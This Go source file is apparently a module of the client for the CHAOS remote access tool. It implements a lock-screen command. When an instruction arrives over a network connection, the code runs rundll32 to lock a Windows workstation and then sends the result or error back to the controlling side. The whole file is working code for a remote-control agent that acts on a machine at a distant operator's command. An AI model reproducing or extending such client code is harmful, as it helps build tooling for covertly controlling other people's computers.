package lock_screen

import (
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"net"
)

type LockScreenUseCase struct {
	Connection net.Conn
}

func NewLockScrenUseCase(conn net.Conn) usecase.LockScreen {
	return &LockScreenUseCase{
		Connection: conn,
	}
}

func (l LockScreenUseCase) Lock() {
	var err error
	switch util.DetectOS() {
	case util.Windows:
		_, err = util.RunCmd("rundll32.exe user32.dll,LockWorkStation", 10)
	default:
		err = usecase.ErrUnsupportedPlatform
	}

	var errData models.Error
	if err != nil {
		errData.HasError = true
		errData.Message = err.Error()
	}

	if err := network.Send(l.Connection, models.Message{
		Command: "lockscreen",
		Error:   errData,
	}); err != nil {
		log.WithField("cause", err.Error()).Error("error locking screen")
	}
}
